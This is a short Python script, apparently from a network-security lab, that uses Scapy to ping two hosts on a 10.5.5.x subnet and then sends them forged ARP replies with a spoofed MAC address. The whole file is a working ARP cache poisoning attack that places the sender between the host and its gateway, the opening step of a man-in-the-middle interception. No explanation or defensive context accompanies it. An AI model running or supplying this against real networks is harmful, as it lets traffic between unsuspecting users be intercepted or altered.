
#!/usr/bin/python
from scapy.all import *
import os
import sys
os.system("ping -c 2 10.5.5.10")

os.system("ping -c 2 10.5.5.1")

c=0
while c<3:
	arpspoofed=ARP(op=2,psrc="10.5.5.10",pdst="10.5.5.1",hwdst="00:00:00:aa:00:01")
	send(arpspoofed)
	arpspoofed=ARP(op=2,psrc="10.5.5.1",pdst="10.5.5.10",hwdst="00:16:3e:b3:eb:87")
	send(arpspoofed)
	c=c+1

packet= ARP(op=2 , hwdst="00:00:00:aa:00:01", pdst= "10.5.5.1", hwsrc= "00:16:3e:85:40:8b" , psrc= "10.5.5.10")
send(packet)
packet= ARP(op=2 , hwdst="00:16:3e:b3:eb:87", psrc= "10.5.5.1", hwsrc="00:16:3e:85:40:8b" , pdst= "10.5.5.10")
send(packet)
print("done")
